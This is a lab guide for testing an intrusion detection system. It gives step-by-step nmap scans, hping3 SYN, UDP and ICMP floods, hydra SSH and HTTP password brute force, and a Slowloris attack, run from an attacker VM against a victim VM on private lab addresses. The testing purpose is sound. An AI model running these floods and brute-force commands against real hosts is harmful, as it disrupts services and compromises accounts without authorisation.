# Complete Attack Guide: Attacker VM → Victim VM

This guide provides step-by-step instructions for generating various network attacks from your attacker VM to your victim VM for testing the IDS system.

## Prerequisites

- ✅ Attacker VM: `192.168.64.4`
- ✅ Victim VM: `192.168.64.3`
- ✅ Both VMs are running: `multipass list`
- ✅ IDS backend is running and monitoring
- ✅ Frontend is open at http://localhost:5173

## Quick Start

1. **Open attacker VM:**
   ```bash
   multipass shell attacker
   ```

2. **Verify connectivity:**
   ```bash
   ping -c 3 192.168.64.3
   ```

3. **Start monitoring in IDS frontend:**
   - Go to "Live Monitoring" page
   - Click "Start Monitoring"
   - Select correct interface (bridge0 or bridge100)

4. **Run attacks from attacker VM**
5. **Watch flows appear in real-time in the IDS dashboard**

---

## Attack Types

### 1. Port Scanning Attacks

Port scanning is the most common reconnaissance technique. The IDS should detect these as "Port Scan" attacks.

#### A. Stealth SYN Scan (Most Common)
```bash
multipass shell attacker

# Quick scan of common ports
nmap -sS -p 1-1000 192.168.64.3

# Full port scan (takes longer, generates more traffic)
nmap -sS -p- 192.168.64.3

# Scan specific port ranges
nmap -sS -p 20-100 192.168.64.3
```

**What to expect:**
- Multiple TCP SYN packets to different ports
- IDS should classify as "Port Scan"
- High confidence score (>0.7)
- Multiple flows in the dashboard

#### B. Aggressive Scan with OS Detection
```bash
multipass shell attacker

# Aggressive scan with OS detection and service version
nmap -A 192.168.64.3

# This generates more traffic and should be easily detected
```

#### C. UDP Port Scan
```bash
multipass shell attacker

# Scan UDP ports (slower, but different pattern)
nmap -sU -p 1-100 192.168.64.3
```

#### D. Fast Scan (Multiple Hosts)
```bash
multipass shell attacker

# Scan multiple ports quickly
nmap -sS -F 192.168.64.3

# Very fast scan (top 100 ports)
nmap -sS --top-ports 100 192.168.64.3
```

**Detection Tips:**
- Port scans generate many flows quickly
- Look for flows with same source IP but different destination ports
- Attack type should be "Port Scan" or "Scan"

---

### 2. Denial of Service (DoS) Attacks

DoS attacks flood the victim with traffic to overwhelm resources.

#### A. SYN Flood Attack
```bash
multipass shell attacker

# SYN flood on port 80 (HTTP)
sudo hping3 --flood --syn -p 80 192.168.64.3

# SYN flood on port 22 (SSH)
sudo hping3 --flood --syn -p 22 192.168.64.3

# Stop with Ctrl+C after 10-20 seconds
```

**What to expect:**
- Massive number of TCP SYN packets
- IDS should detect as "DoS" or "DDoS"
- High severity (red)
- Very high packet count in sniffer stats

#### B. UDP Flood Attack
```bash
multipass shell attacker

# UDP flood
sudo hping3 --flood --udp -p 80 192.168.64.3

# Stop with Ctrl+C
```

#### C. ICMP Flood (Ping Flood)
```bash
multipass shell attacker

# Ping flood
sudo hping3 --flood --icmp 192.168.64.3

# Or using ping
ping -f 192.168.64.3
# Note: May need sudo on some systems
```

**Detection Tips:**
- DoS attacks generate extremely high packet rates
- Look for flows with same destination IP/port
- Very high confidence scores
- Attack type: "DoS" or "DDoS"

---

### 3. Brute Force Attacks

Brute force attacks attempt to guess passwords by trying many combinations.

#### A. SSH Brute Force
```bash
multipass shell attacker

# Create a wordlist
cat > wordlist.txt << EOF
password123
admin
root
123456
password
test
ubuntu
admin123
root123
EOF

# SSH brute force attack
hydra -l testuser -P wordlist.txt ssh://192.168.64.3

# With more verbose output
hydra -l testuser -P wordlist.txt -v ssh://192.168.64.3

# Faster attack (more threads)
hydra -l testuser -P wordlist.txt -t 4 ssh://192.168.64.3
```

**What to expect:**
- Many SSH connection attempts
- Same source IP, same destination port (22)
- IDS should detect as "Brute Force"
- Medium to high confidence

#### B. HTTP Login Brute Force
```bash
multipass shell attacker

# If victim has a web server, try HTTP login
hydra -l admin -P wordlist.txt http-get://192.168.64.3/

# HTTP POST form
hydra -l admin -P wordlist.txt http-post-form://192.168.64.3/login:username=^USER^&password=^PASS^:Invalid
```

**Detection Tips:**
- Brute force shows repeated connection attempts
- Same source, same destination port
- Attack type: "Brute Force"
- Multiple failed connection attempts

---

### 4. Advanced Attacks

#### A. Fragmented Packets (Evasion Technique)
```bash
multipass shell attacker

# Send fragmented packets
sudo hping3 -f -p 80 192.168.64.3

# Fragmented SYN scan
nmap -sS -f 192.168.64.3
```

#### B. Slowloris Attack (Slow HTTP)
```bash
multipass shell attacker

# Install slowhttptest if available
# sudo apt install slowhttptest

# Slow HTTP attack
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.64.3 -x 24 -p 3
```

#### C. Xmas Tree Scan
```bash
multipass shell attacker

# Xmas tree scan (sets FIN, PSH, URG flags)
nmap -sX -p 1-100 192.168.64.3
```

---

## Attack Sequences for Testing

### Sequence 1: Reconnaissance → Attack
```bash
multipass shell attacker

# Step 1: Port scan (reconnaissance)
nmap -sS -p 1-1000 192.168.64.3

# Wait 30 seconds, then...

# Step 2: DoS attack
sudo hping3 --flood --syn -p 80 192.168.64.3
# Run for 15 seconds, then Ctrl+C

# Step 3: Brute force
hydra -l testuser -P wordlist.txt ssh://192.168.64.3
```

### Sequence 2: Multiple Attack Types
```bash
multipass shell attacker

# Terminal 1: Port scan
nmap -sS -p- 192.168.64.3

# Terminal 2 (new multipass shell): DoS
sudo hping3 --flood --syn -p 22 192.168.64.3
```

### Sequence 3: Continuous Attack
```bash
multipass shell attacker

# Run for 2 minutes, generating continuous traffic
for i in {1..10}; do
  nmap -sS -p $((i*100))-$((i*100+50)) 192.168.64.3
  sleep 5
done
```

---

## Monitoring in IDS

### What to Watch For

1. **Live Monitoring Page:**
   - Flows appearing in real-time
   - Attack types being classified
   - Severity levels (high/medium/low)
   - Confidence scores

2. **Sniffer Statistics:**
   - Packets Captured: Should increase rapidly
   - Packets Processed: Should match captured (or close)
   - Active Flows: Number of flows being tracked

3. **Dashboard:**
   - Total flows count
   - Attack ratio
   - Most frequent attack type
   - Charts updating

### Expected Detection Times

- **Port Scan**: 5-10 seconds after starting scan
- **DoS Attack**: Immediate (high packet rate)
- **Brute Force**: 10-15 seconds (after multiple attempts)

---

## Troubleshooting

### No Flows Appearing

1. **Check sniffer is running:**
   - Look for "Sniffer: ON" in UI
   - Check backend logs for errors

2. **Verify interface:**
   - Make sure correct interface is selected
   - bridge0 or bridge100 for VMs
   - Check "Sniffer Statistics" for packet counts

3. **Test connectivity:**
   ```bash
   # From attacker VM
   ping -c 5 192.168.64.3
   
   # Should see packets in sniffer stats
   ```

4. **Check permissions:**
   - Backend may need `sudo` for packet capture
   - Run: `sudo uvicorn app.main:app --reload`

### Flows Appear But No Attacks Detected

1. **Wait longer:** Flows need 5+ packets or 10+ seconds to process
2. **Generate more traffic:** Some attacks need more packets to be detected
3. **Check attack type:** Some may be classified as "BENIGN" if pattern doesn't match

### Wrong Attack Type Detected

- ML models may misclassify some attacks
- This is normal - the system is learning
- Check confidence scores (higher = more certain)

---

## Quick Reference Commands

```bash
# Enter attacker VM
multipass shell attacker

# Port Scan
nmap -sS -p 1-1000 192.168.64.3

# DoS Attack
sudo hping3 --flood --syn -p 80 192.168.64.3

# Brute Force
hydra -l testuser -P wordlist.txt ssh://192.168.64.3

# Ping Test
ping -c 10 192.168.64.3
```

---

## Best Practices

1. **Start with simple attacks** (ping, port scan) to verify system works
2. **Monitor in real-time** to see immediate results
3. **Run attacks for 10-30 seconds** to generate enough traffic
4. **Check backend logs** for detailed processing information
5. **Use different attack types** to test various detection capabilities

---

## Next Steps

1. ✅ Run a simple port scan to verify detection works
2. ✅ Try a DoS attack to see high-severity detection
3. ✅ Run brute force to test authentication attack detection
4. ✅ Check Dashboard for overall statistics
5. ✅ Review Model Insights to understand detection accuracy

Happy testing! 🚀

